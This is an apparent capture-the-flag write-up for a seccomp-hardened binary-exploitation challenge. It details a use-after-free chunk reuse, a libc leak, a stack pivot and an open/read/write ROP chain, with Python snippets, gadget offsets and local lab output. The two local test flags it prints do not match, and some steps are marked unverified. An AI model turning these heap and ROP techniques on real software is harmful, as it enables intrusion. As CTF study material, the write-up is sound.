# CCU Banking Access Terminal, Premium Tier (2/2) - Pwn (499)

**Flag:** not captured - the only string ever read back is the local lab's fake flag · **Points:** 499 · **Authors:** soup, adlee7
**Files:** `files/ccu-premium-terminal.zip` (1,127,978 B, sha256 `2e3e1d6f99afd93227d625cd55bc90a89d575d61e5af18ef49f2259d7c2529e8`)

> This case sits in `_wip/` because there is no real flag yet. The exploit chain was
> verified 5/5 runs against a local lab (`analysis/service.py` +
> `analysis/flagfile.local`); what is missing is running `exploit.py` from the
> competition workstation and recording the flag. Every number and address below comes
> from disassembly of the shipped artifact and from the saved local run in
> `analysis/local_run_output.bin`.

## Challenge

The service at `chal:2324` emulates a 1997 bank terminal and speaks raw bytes. The
handout ships `ccu_premium`, libc Ubuntu GLIBC 2.35-0ubuntu3.15, the matching loader and
`libseccomp.so.2`. The flag lives in `/flag` on the service host. Login is member `8802`
/ PIN `2049`. Menu items that ask for a "branch page" want exactly 384 raw bytes, not a
line. Versus tier 1 the new part is the seccomp-bpf filter (`install_filter` is called
before `do_login`) and the extra header line `TERMINAL HARDENING: ACTIVE`.

## Initial analysis

`file` reports `ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped`, so
the binary is **non-PIE**: every address inside it (`0x400000` + offset) is a constant and
no text leak is needed. `objdump` shows a very small program shape:

```text
main:  drop_inherited_fds  limits  banner  install_filter  do_login  menu_loop
```

Four observations drive the whole solution:

1. `install_filter` @0x4014af: `seccomp_init(0x80000000)` (default `SCMP_ACT_KILL`), then a
   loop `i <= 0xa` installing 11 entries from the table `allowed.0` @0x404160. Dumping the
   correct file offset `0x4160` yields 11 little-endian dwords:

```text
   00000000 01000000 02000000 01010000 08000000 05000000
   0c000000 09000000 0b000000 3c000000 e7000000
   ```

   i.e. `read, write, open, openat, lseek, fstat, brk, mmap, munmap, exit, exit_group`.
   **No `execve`, no `fork/clone`, and no `mprotect` (10)** - so no shell spawn and no JIT
   shellcode. The exploit uses an open/read/write chain.

2. Every record is a fixed-size page: `open_account` @0x401f31 and `attach_memo` @0x402590
   both `malloc(0x180)` then `read_full(ptr, 0x180)`. `read_full` @0x401693 loops
   `read(0, buf+done, remaining)` until all 384 bytes arrive and does not stop at `\n`.
   So we can write **384 raw bytes into heap data**.

3. `show_summary` @0x401cab iterates **all** records (closed ones included) and per record
   does three things: `write(1, rec+0x10, 0x18)` prints 24 raw bytes of the page (an
   arbitrary static/heap read primitive), `money(rec, 0x30, rec+0x08)` prints `rec+0x08` as
   a full 64-bit decimal, then:

```asm
   401e9b: mov 0x28(%rax),%rdx     # rax = rec
   401ea3: mov %rax,%rdi           # rdi = rec
   401ea6: call *%rdx              # dividend callback
   ```

   `call *[rec+0x28]` with `rdi` pointing at the record: the callback overwrite controls RIP; the pivot described below controls the stack pointer.

4. `close_account` @0x40223c calls `free(accounts[i-1])`, sets `closed[i]=1`, but **never
   clears the pointer** and never decrements `n_accounts` → `accounts[]` keeps a dangling
   pointer, and `show_summary` still walks it.

Combining 2 + 3 + 4: close a record, then attach a memo. `malloc(0x180)` for the memo
returns the just-freed record chunk (tcache LIFO, same size), and the memo path applies
**no field fixups** (unlike `open_account`), so the memo's 384 bytes become the record body
with `+0x28` chosen by us.

## Ruled out

1. **Format string in `show_summary`**: the hypothesis that `printf(branch_page)` uses our
   data as the format. Wrong. The only string printed around the value is
   `0x4036f8 "PROJECTED PERIOD DIVIDEND : %.2f"` and the `NICKNAME`/`BALANCE` formats are
   constants in `.rodata`; the binary **has no format-string primitive at all**. Every
   `%55$llx` / `%65$llx` branch page did nothing. The real leak primitives are `money()` on
   `rec+0x08` and `write(1, rec+0x10, 0x18)`.
2. **Guessing the seccomp table instead of dumping it**: reading `allowed.0` as bytes sitting
   next to the jump table produced `9,15,16,21,23,25,32,37,38,42` (including `mprotect`) and
   a plan for an RWX `mmap` + shellcode. Dumping offset `0x4160` properly (table in the
   Initial analysis section) shows **syscall 10 is absent**, so the plan requiring `mprotect` is unavailable. This alone does not exclude executable `mmap`.
3. **Overrunning the 384-byte page to hit the next memos/accounts entry**: `read_full` reads
   exactly the requested count into a `malloc(0x180)` chunk (real chunk is 0x190 with its
   header); there is no linear overflow off the page. The write comes from **chunk reuse**,
   not from an overflow.
4. **Setting `+0x28` directly in a record's branch page**: after reading the page,
   `open_account` overwrites `+0x00` (number), `+0x04` (type - 1), `+0x08` (scaled balance)
   and `+0x28 = RATE_TABLE[type-1]`, and sets `+0x27 = 0`. Our value at `+0x28` is erased.
   So the exploit uses the memo type confusion.
5. **Looping callback offsets with `0xdeadbeefcafe0000`**: because of (4), these attempts only
   burned connections (login allows 3 tries) and mapped nothing.
6. **Tooling friction (logged so it is not repeated)**: pasting Python into bash gives
   `bash: from: command not found`; `io.recvuntil(b"> ")` raises `EOFError` because the real
   prompt is `Selection: `; `default.timeout = 10` is a `NameError` and
   `context.default.timeout` an `AttributeError` (the correct form is `context.timeout`);
   the server needs generous timeouts and buffer-based reads rather than line-based ones.

## Exploit chain

**Step 1 - Spray 7 chunks into tcache and 2 into the unsorted bin to leak libc.**
Open 9 records, then close all 9 in order. `n_accounts` is not decremented, so all 9 are
still walked. The two chunks that reach the unsorted bin hold a `bk` pointer into libc's
`main_arena`, and `money()` prints `rec+0x08` as a full decimal, enough to recover base.
The working delta for this exact libc build is `LIBC_BINS0 = 0x21ACE0` (calibrated through
`/proc/<pid>/maps` in the local lab). Candidate filter: `v >> 47 == 0` (canonical address)
and `(v - 0x21ACE0) % 0x1000 == 0`.

```python
for _ in range(9):                       # 9 x malloc(0x180)
    send(s, b"2\n"); wait(s, st, b"Record type")
    send(s, b"1\n"); wait(s, st, b"Opening balance")
    send(s, b"0\n"); wait(s, st, b"PAGE>")
    send(s, b"A"*0x10 + b"\x00"*(384-0x10)); wait(s, st, b"Selection:")
for i in range(1, 10):                   # 7 -> tcache, 8,9 -> unsorted bin
    send(s, b"3\n"); wait(s, st, b"Record to close")
    send(s, b"%d\n" % i); wait(s, st, b"Selection:")
send(s, b"1\n")                          # show_summary: money() prints rec+0x08
```

Real output from the local run (`analysis/local_run_output.bin`):

```text
[+] logged in
[+] 9 records opened
[+] 9 records closed
[*] libc base = 0x793845b9f000
```

**Step 2 - The memo reclaims the record chunk and puts the pivot at `+0x28`.**
No heap leak is needed: `call *[rec+0x28]` comes with `rdi = rec`, and the binary already
contains `mov rsp,rdi; ret` at `0x401369` (raw bytes verified: `48 89 fc c3`). After the
pivot `rsp == rec`, so **the 384-byte page itself becomes the ROP stack**: RIP is taken
from `+0x00`, following slots from `+0x08`, `+0x10`, ...

```python
PIVOT = 0x401369          # mov rsp,rdi ; ret
st["b"] = b""
send(s, b"5\n"); wait(s, st, b"PAGE>")
send(s, chain(libc)); wait(s, st, b"Selection:")
```

**Step 3 - orw ROP inside libc.** The binary has no `syscall` instruction and no `pop rdi`
(only `ret`, `pop rbp;ret`, `leave;ret` and the pivot), so every gadget must come from
libc: `POP_RDI 0x2A3E5`, `POP_RSI 0x2BE51`, `POP_RAX 0x45EB0`, `POP_RDX 0x90469` (the
`pop rdx;pop rbx;ret` form - this libc has no plain `pop rdx;ret`), `OPEN 0x114630`;
`read/write/exit` use the binary's PLT (`0x401150 / 0x4010a0 / 0x401070`).
The chain: `read(0, 0x406300, 8)` (we send `"/flag\0\0\0"` right after the trigger) →
`write(1, 0x406300, 8)` to confirm the filename was installed → `open(0x406300, 0)` →
`read(3, 0x406340, 0x200)` → `write(1, 0x406340, 0x40)` → `_exit`.
`0x406300/0x406340` sit in the last RW page of the binary (`.bss` ends at `0x406288` but
the page runs to `0x407000`); **do not use `0x406018`**, whose `.got.plt` holds live
pointers. The fd is always 3 because `drop_inherited_fds` closes 3..255. Slot `+0x28` must
be consumed by a single pop gadget - here `pop rax;ret`; putting `pop rsi;ret` there was a
real bug because it clobbers the buffer argument of `read()`.

Data read back during the local run, with `/flag` pointing at `analysis/flagfile.local`:

```text
  7) RECORD 1169986533  TYPE 31032      SHARE DRAFT    CLOSED
     BALANCE  : $0.00
/flag\x00\x00\x00cdctf{LOCAL_TEST_FLAG_abc123}\n
```

**Step 4 - Local verification.** The recorded checks are: (a) the value
printed at `rec+0x08` is canonical and equals `libc_base + 0x21ACE0` with the residue
consistent with an `mmap`-aligned libc; (b) the echo step `write(1, 0x406300, 8)` returns
exactly `"/flag\0\0\0"` before `open` runs, proving the scratch page is writable; (c) the
dumped content is exactly 32 bytes, matching the length of the local `flagfile`. The chain
ran 5/5 consecutive times in the lab.

## Flag

Not captured from the instance. The local lab only reads back a self-made flag:

```bash
cat analysis/flagfile.local
```

```text
cdctf{LOCAL_FAKE_FLAG_not_real}
```

To obtain the real flag: start an instance, open its workstation, `cat > solve.py`, paste
the contents of `exploit.py` (it already targets `HOST, PORT = "chal", 2324`), run it, write
the flag into `flag.txt`, then move the case out of `_wip/`.

## Reproduce

```bash
# local lab, one terminal
python analysis/service.py 2324          # socket front-end running ccu_premium via the shipped loader
# second terminal, cwd holding ccu_premium/libc/ld/libseccomp
python exploit.py                        # HOST, PORT = "chal", 2324 -> change to 127.0.0.1
```

## Still to verify

- The real flag from the instance (missing; the reason this case is in `_wip/`).
- The `+0x28 = RATE_TABLE[type-1]` and `+0x27 = 0` writes in `open_account`: inferred from
  the local run (a directly submitted page cannot hold a callback) rather than quoted line by
  line here; the full listing is at `_scratch/ccu/dis.txt`.
- `limits()` values (RLIMIT/alarm): not re-read during this session.
